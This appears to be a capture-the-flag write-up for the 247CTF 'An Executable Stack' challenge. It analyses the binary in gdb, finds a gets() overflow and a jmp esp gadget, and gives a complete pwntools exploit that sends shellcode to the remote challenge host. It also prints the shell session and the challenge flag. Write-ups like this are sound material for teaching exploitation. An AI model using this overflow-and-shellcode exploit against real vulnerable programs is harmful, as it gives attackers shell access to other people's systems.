# AN EXECUTABLE STACK

---

Description:

There are no hidden flag functions in this binary. Can you make your own using the stack?


---


Basic file check:

---
```bash
❯ checksec --file=executable_stack
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   70 Symbols	 No	0		1		executable_stack
```

---

running the program :

```bash
❯ ./executable_stack
There are no flag functions here!
You can try to make your own though:
just give me a flag!
```

---

Let's open the file in gdb:

---

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0804830c  _init
0x08048340  setbuf@plt
0x08048350  gets@plt
0x08048360  puts@plt
0x08048370  __libc_start_main@plt
0x08048380  __gmon_start__@plt
0x08048390  _start
0x080483d0  _dl_relocate_static_pie
0x080483e0  __x86.get_pc_thunk.bx
0x080483f0  deregister_tm_clones
0x08048430  register_tm_clones
0x08048470  __do_global_dtors_aux
0x080484a0  frame_dummy
0x080484a6  asm_bounce
0x080484b8  chall
0x080484e6  main
0x0804853c  __x86.get_pc_thunk.ax
0x08048540  __libc_csu_init
0x080485a0  __libc_csu_fini
0x080485a4  _fini
pwndbg> disass main
Dump of assembler code for function main:
   0x080484e6 <+0>:	lea    ecx,[esp+0x4]
   0x080484ea <+4>:	and    esp,0xfffffff0
   0x080484ed <+7>:	push   DWORD PTR [ecx-0x4]
   0x080484f0 <+10>:	push   ebp
   0x080484f1 <+11>:	mov    ebp,esp
   0x080484f3 <+13>:	push   ebx
   0x080484f4 <+14>:	push   ecx
   0x080484f5 <+15>:	call   0x80483e0 <__x86.get_pc_thunk.bx>
   0x080484fa <+20>:	add    ebx,0x1b06
   0x08048500 <+26>:	mov    eax,DWORD PTR [ebx-0x4]
   0x08048506 <+32>:	mov    eax,DWORD PTR [eax]
   0x08048508 <+34>:	sub    esp,0x8
   0x0804850b <+37>:	push   0x0
   0x0804850d <+39>:	push   eax
   0x0804850e <+40>:	call   0x8048340 <setbuf@plt>
   0x08048513 <+45>:	add    esp,0x10
   0x08048516 <+48>:	sub    esp,0xc
   0x08048519 <+51>:	lea    eax,[ebx-0x1a40]
   0x0804851f <+57>:	push   eax
   0x08048520 <+58>:	call   0x8048360 <puts@plt>
   0x08048525 <+63>:	add    esp,0x10
   0x08048528 <+66>:	call   0x80484b8 <chall>
   0x0804852d <+71>:	mov    eax,0x0
   0x08048532 <+76>:	lea    esp,[ebp-0x8]
   0x08048535 <+79>:	pop    ecx
   0x08048536 <+80>:	pop    ebx
   0x08048537 <+81>:	pop    ebp
   0x08048538 <+82>:	lea    esp,[ecx-0x4]
   0x0804853b <+85>:	ret
End of assembler dump.
pwndbg> disass chall
Dump of assembler code for function chall:
   0x080484b8 <+0>:	push   ebp
   0x080484b9 <+1>:	mov    ebp,esp
   0x080484bb <+3>:	push   ebx
   0x080484bc <+4>:	sub    esp,0x84
   0x080484c2 <+10>:	call   0x804853c <__x86.get_pc_thunk.ax>
   0x080484c7 <+15>:	add    eax,0x1b39
   0x080484cc <+20>:	sub    esp,0xc
   0x080484cf <+23>:	lea    edx,[ebp-0x88]
   0x080484d5 <+29>:	push   edx
   0x080484d6 <+30>:	mov    ebx,eax
   0x080484d8 <+32>:	call   0x8048350 <gets@plt>
   0x080484dd <+37>:	add    esp,0x10
   0x080484e0 <+40>:	nop
   0x080484e1 <+41>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080484e4 <+44>:	leave
   0x080484e5 <+45>:	ret
End of assembler dump.
pwndbg> disass asm_bounce
Dump of assembler code for function asm_bounce:
   0x080484a6 <+0>:	push   ebp
   0x080484a7 <+1>:	mov    ebp,esp
   0x080484a9 <+3>:	call   0x804853c <__x86.get_pc_thunk.ax>
   0x080484ae <+8>:	add    eax,0x1b52
   0x080484b3 <+13>:	jmp    esp
   0x080484b5 <+15>:	nop
   0x080484b6 <+16>:	pop    ebp
   0x080484b7 <+17>:	ret
End of assembler dump.
pwndbg>

```

---

gets function is used in the chall function which is dangerous

There's a asm_bounce function which is interesting 
I may jump to the stack where our shellcode is kept by using the memory location ***0x080484b3***, which will return our shell.

---

Now we can craft the payload. Firstly  let's fine the offset

---

```bash
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> run
Starting program: /home/lynk/247/anexecutable/executable_stack 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
There are no flag functions here!
You can try to make your own though:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x6261616b in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────
*EAX  0xffffd410 ◂— 0x61616161 ('aaaa')
*EBX  0x62616169 ('iaab')
*ECX  0xf7e1f9c4 (_IO_stdfile_0_lock) ◂— 0x0
 EDX  0x0
*EDI  0xf7ffcba0 (_rtld_global_ro) ◂— 0x0
*ESI  0x8048540 (__libc_csu_init) ◂— 0x53565755
*EBP  0x6261616a ('jaab')
*ESP  0xffffd4a0 ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
*EIP  0x6261616b ('kaab')
────────────────────[ DISASM / i386 / set emulate on ]─────────────────────
Invalid address 0x6261616b










─────────────────────────────────[ STACK ]─────────────────────────────────
00:0000│ esp 0xffffd4a0 ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
01:0004│     0xffffd4a4 ◂— 'maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
02:0008│     0xffffd4a8 ◂— 'naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
03:000c│     0xffffd4ac ◂— 'oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
04:0010│     0xffffd4b0 ◂— 'paabqaabraabsaabtaabuaabvaabwaabxaabyaab'
05:0014│     0xffffd4b4 ◂— 'qaabraabsaabtaabuaabvaabwaabxaabyaab'
06:0018│     0xffffd4b8 ◂— 'raabsaabtaabuaabvaabwaabxaabyaab'
07:001c│     0xffffd4bc ◂— 'saabtaabuaabvaabwaabxaabyaab'
───────────────────────────────[ BACKTRACE ]───────────────────────────────
 ► 0 0x6261616b
   1 0x6261616c
   2 0x6261616d
   3 0x6261616e
   4 0x6261616f
   5 0x62616170
   6 0x62616171
   7 0x62616172
───────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l kaab
Finding cyclic pattern of 4 bytes: b'kaab' (hex: 0x6b616162)
Found at offset 140
pwndbg>
```

Offset is 140

---

It's payload time:

---

```python3
from pwn import *

context.binary = binary = "./executable_stack"
shellcode = shellcraft.sh()

payload = b'A' * 140 + p32(0x080484b3) + asm(shellcode)
p = process()
p = remote("b1845851da1828af.247ctf.com", 50322)

p.recv()
p.sendline(payload)
p.interactive()
```

---

Running the exploit:

---

```bash
❯ python3 exp.py
[*] '/home/lynk/247/anexecutable/executable_stack'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
[+] Starting local process '/home/lynk/247/anexecutable/executable_stack': pid 7943
[+] Opening connection to b1845851da1828af.247ctf.com on port 50322: Done
[*] Switching to interactive mode
$ ls
chall
flag_27886b9a498ed936.txt
$ cat flag_27886b9a498ed936.txt
247CTF{27886b9a498ed93685af9db0b1e304ec}
$
```

---

